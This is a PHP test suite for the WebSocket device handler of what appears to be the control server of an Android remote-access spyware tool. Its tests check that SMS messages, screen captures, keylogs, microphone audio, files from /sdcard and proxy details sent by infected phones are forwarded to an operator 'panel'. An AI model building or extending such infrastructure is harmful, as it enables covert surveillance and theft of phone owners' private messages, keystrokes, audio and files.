<?php

declare(strict_types=1);

use App\WebSocket\ConnectionManager;
use App\WebSocket\Handlers\DeviceHandler;
use App\WebSocket\Services\HeartbeatService;
use Swoole\WebSocket\Server as SwooleServer;

beforeEach(function () {
    $this->mockServer = Mockery::mock(SwooleServer::class);
    $this->mockServer->shouldReceive('isEstablished')->andReturn(true)->byDefault();
    $this->mockServer->shouldReceive('push')->andReturn(true)->byDefault();
    $this->mockServer->shouldReceive('close')->andReturn(true)->byDefault();
    $this->mockServer->shouldReceive('getClientInfo')->andReturn(['remote_ip' => '192.168.1.100'])->byDefault();

    $this->connectionManager = Mockery::mock(ConnectionManager::class);
    $this->connectionManager->shouldReceive('getServer')->andReturn($this->mockServer)->byDefault();

    $this->heartbeatService = Mockery::mock(HeartbeatService::class);

    $this->handler = new DeviceHandler($this->connectionManager, $this->heartbeatService);
});

afterEach(function () {
    Mockery::close();
});

describe('DeviceHandler', function () {
    describe('handle()', function () {
        it('ignores messages without pid', function () {
            $this->connectionManager->shouldNotReceive('registerDevice');
            $this->connectionManager->shouldReceive('getPhoneId')->andReturn(null);

            $this->handler->handle(1, ['itype' => 'Slr_client', 'subc' => 'ping']);

            expect(true)->toBeTrue();
        });

        it('registers new device on first message', function () {
            $phoneId = 'test-device-123';
            $fd = 1;

            $this->connectionManager->shouldReceive('getPhoneId')->with($fd)->andReturn(null);
            $this->connectionManager->shouldReceive('registerDevice')->with($fd, $phoneId)->once();
            $this->heartbeatService->shouldReceive('recordPing')->with($phoneId)->once();
            $this->connectionManager->shouldReceive('updateDeviceStatus')->andReturn(null);
            $this->connectionManager->shouldReceive('getDeviceStatus')->andReturn([]);
            $this->connectionManager->shouldReceive('isDeviceOnline')->andReturn(true);
            $this->connectionManager->shouldReceive('sendToPanels')->once();

            $this->handler->handle($fd, [
                'itype' => 'Slr_client',
                'pid' => $phoneId,
                'subc' => 'ping',
                'msg' => 'phone_name=Test&model=Pixel',
            ]);
        });

        it('does not re-register existing device', function () {
            $phoneId = 'test-device-123';
            $fd = 1;

            $this->connectionManager->shouldReceive('getPhoneId')->with($fd)->andReturn($phoneId);
            $this->connectionManager->shouldNotReceive('registerDevice');
            $this->heartbeatService->shouldReceive('recordPing')->with($phoneId)->once();
            $this->connectionManager->shouldReceive('updateDeviceStatus')->andReturn(null);
            $this->connectionManager->shouldReceive('getDeviceStatus')->andReturn([]);
            $this->connectionManager->shouldReceive('isDeviceOnline')->andReturn(true);
            $this->connectionManager->shouldReceive('sendToPanels')->once();

            $this->handler->handle($fd, [
                'itype' => 'Slr_client',
                'pid' => $phoneId,
                'subc' => 'ping',
                'msg' => '',
            ]);
        });
    });

    describe('ping handling', function () {
        it('records ping and updates device status', function () {
            $phoneId = 'test-device-123';
            $fd = 1;
            $deviceInfo = 'phone_name=TestDevice&model=Pixel%208&battery_charge=85&accessibility=1';

            $this->connectionManager->shouldReceive('getPhoneId')->andReturn($phoneId);
            $this->heartbeatService->shouldReceive('recordPing')->with($phoneId)->once();
            $this->connectionManager->shouldReceive('updateDeviceStatus')
                ->withArgs(function ($pid, $data) use ($phoneId) {
                    return $pid === $phoneId && isset($data['last_ping']);
                })
                ->once();
            $this->connectionManager->shouldReceive('getDeviceStatus')->andReturn([
                'name' => 'TestDevice',
                'model' => 'Pixel 8',
                'battery_level' => '85',
            ]);
            $this->connectionManager->shouldReceive('isDeviceOnline')->andReturn(true);
            $this->connectionManager->shouldReceive('sendToPanels')
                ->withArgs(function ($pid, $data) use ($phoneId) {
                    return $pid === $phoneId
                        && $data['type'] === 'deviceUpdate'
                        && isset($data['phoneInfo']);
                })
                ->once();

            $this->handler->handle($fd, [
                'itype' => 'Slr_client',
                'pid' => $phoneId,
                'subc' => 'ping',
                'msg' => $deviceInfo,
            ]);
        });
    });

    describe('message forwarding', function () {
        it('forwards SMS data to subscribed panels', function () {
            $phoneId = 'test-device-123';
            $fd = 1;
            $smsData = '{"address":"10086","body":"Test message"}';

            $this->connectionManager->shouldReceive('getPhoneId')->andReturn($phoneId);
            $this->connectionManager->shouldReceive('sendToPanels')
                ->withArgs(function ($pid, $data) use ($phoneId, $smsData) {
                    return $pid === $phoneId
                        && $data['type'] === 'sms'
                        && $data['data'] === $smsData
                        && $data['pid'] === $phoneId;
                })
                ->once();

            $this->handler->handle($fd, [
                'itype' => 'Slr_client',
                'pid' => $phoneId,
                'subc' => 'sms',
                'msg' => $smsData,
            ]);
        });

        it('forwards screen data with dimensions', function () {
            $phoneId = 'test-device-123';
            $fd = 1;

            $this->connectionManager->shouldReceive('getPhoneId')->andReturn($phoneId);
            $this->connectionManager->shouldReceive('sendToPanels')
                ->withArgs(function ($pid, $data) use ($phoneId) {
                    return $pid === $phoneId
                        && $data['type'] === 'screen'
                        && $data['data'] === 'base64-image'
                        && $data['wmob'] === 1080
                        && $data['hmob'] === 1920;
                })
                ->once();

            $this->handler->handle($fd, [
                'itype' => 'Slr_client',
                'pid' => $phoneId,
                'subc' => 'screen',
                'img' => 'base64-image',
                'wmob' => 1080,
                'hmob' => 1920,
            ]);
        });

        it('forwards klogs as klog type', function () {
            $phoneId = 'test-device-123';
            $fd = 1;

            $this->connectionManager->shouldReceive('getPhoneId')->andReturn($phoneId);
            $this->connectionManager->shouldReceive('sendToPanels')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'klog';
                })
                ->once();

            $this->handler->handle($fd, [
                'itype' => 'Slr_client',
                'pid' => $phoneId,
                'subc' => 'klogs',
                'msg' => 'keylog data',
            ]);
        });

        it('forwards mic data using voip field', function () {
            $phoneId = 'test-device-123';
            $fd = 1;

            $this->connectionManager->shouldReceive('getPhoneId')->andReturn($phoneId);
            $this->connectionManager->shouldReceive('sendToPanels')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'mic'
                        && $data['data'] === 'audio-base64';
                })
                ->once();

            $this->handler->handle($fd, [
                'itype' => 'Slr_client',
                'pid' => $phoneId,
                'subc' => 'mic',
                'voip' => 'audio-base64',
            ]);
        });

        it('forwards thumb data with path', function () {
            $phoneId = 'test-device-123';
            $fd = 1;

            $this->connectionManager->shouldReceive('getPhoneId')->andReturn($phoneId);
            $this->connectionManager->shouldReceive('sendToPanels')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'thumb'
                        && $data['path'] === '/sdcard/image.jpg';
                })
                ->once();

            $this->handler->handle($fd, [
                'itype' => 'Slr_client',
                'pid' => $phoneId,
                'subc' => 'thumb',
                'msg' => 'thumbnail-base64',
                'pth' => '/sdcard/image.jpg',
            ]);
        });

        it('forwards file download chunks', function () {
            $phoneId = 'test-device-123';
            $fd = 1;

            $this->connectionManager->shouldReceive('getPhoneId')->andReturn($phoneId);
            $this->connectionManager->shouldReceive('sendToPanels')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'down'
                        && $data['filename'] === 'test.zip'
                        && $data['chunkNumber'] === 1
                        && $data['totalSize'] === 1024;
                })
                ->once();

            $this->handler->handle($fd, [
                'itype' => 'Slr_client',
                'pid' => $phoneId,
                'subc' => 'down',
                'filename' => 'test.zip',
                'filedata' => 'chunk-data',
                'totalSize' => 1024,
                'sentSize' => 256,
                'chunkNumber' => 1,
                'filehash' => 'abc123',
                'filepath' => '/sdcard/test.zip',
            ]);
        });
    });

    describe('proxy message handling', function () {
        it('handles proxy first message with IP info', function () {
            $phoneId = 'test-device-123';
            $fd = 1;

            $this->connectionManager->shouldReceive('getPhoneId')->andReturn($phoneId);
            $this->connectionManager->shouldReceive('getClientIp')->with($phoneId)->andReturn('192.168.1.100');
            $this->connectionManager->shouldReceive('sendToPanels')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'proxy'
                        && $data['calltype'] === 'first'
                        && $data['extip'] === '192.168.1.100'
                        && $data['locip'] === '10.0.0.1'
                        && $data['pxport'] === '8888';
                })
                ->once();

            $this->handler->handle($fd, [
                'itype' => 'Slr_client',
                'pid' => $phoneId,
                'subc' => 'proxy',
                'ctype' => 'first',
                'loip' => '10.0.0.1',
                'pport' => '8888',
            ]);
        });

        it('handles proxy state message', function () {
            $phoneId = 'test-device-123';
            $fd = 1;

            $this->connectionManager->shouldReceive('getPhoneId')->andReturn($phoneId);
            $this->connectionManager->shouldReceive('sendToPanels')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'proxy'
                        && $data['calltype'] === 'state'
                        && $data['pstate'] === 'connected';
                })
                ->once();

            $this->handler->handle($fd, [
                'itype' => 'Slr_client',
                'pid' => $phoneId,
                'subc' => 'proxy',
                'ctype' => 'state',
                'pxstate' => 'connected',
            ]);
        });
    });
});
